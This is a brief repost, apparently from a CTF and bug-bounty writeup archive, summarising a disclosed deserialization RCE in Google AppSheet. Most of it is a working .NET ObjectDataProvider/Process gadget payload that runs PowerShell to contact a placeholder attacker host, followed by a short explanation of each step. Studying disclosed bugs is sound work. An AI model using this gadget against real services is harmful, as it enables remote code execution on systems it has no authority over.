# :globe_with_meridians: 💣 $10,000 Google Bug Bounty: How a Deserialization RCE in AppSheet Could Have Led to Remote Code Execution on Google’s Infrastructure

> **Original Source:** [💣 $10,000 Google Bug Bounty: How a Deserialization RCE in AppSheet Could Have Led to Remote Code Execution on Google’s Infrastructure](https://infosecwriteups.com/10-000-google-bug-bounty-how-a-deserialization-rce-in-appsheet-could-have-led-to-remote-code-955b0a2e840b)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## 💻 Malicious Payload Example


```
{
"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
"MethodName": "Start",
"MethodParameters": {
"$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"$values": [
"cmd",
"/c powershell -command \"Invoke-WebRequest -URI http://attacker-server.com\""
]
},
"ObjectInstance": {
"$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
}
}
```


📌 What it does:


- `ObjectDataProvider` dynamically calls `Start`

- `Process` spawns a new system process

- PowerShell sends a web request to the attacker’s server (proof of code execution)


*Attack Chain Illustratio*

---

*Originally published on [Medium](https://infosecwriteups.com/10-000-google-bug-bounty-how-a-deserialization-rce-in-appsheet-could-have-led-to-remote-code-955b0a2e840b). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
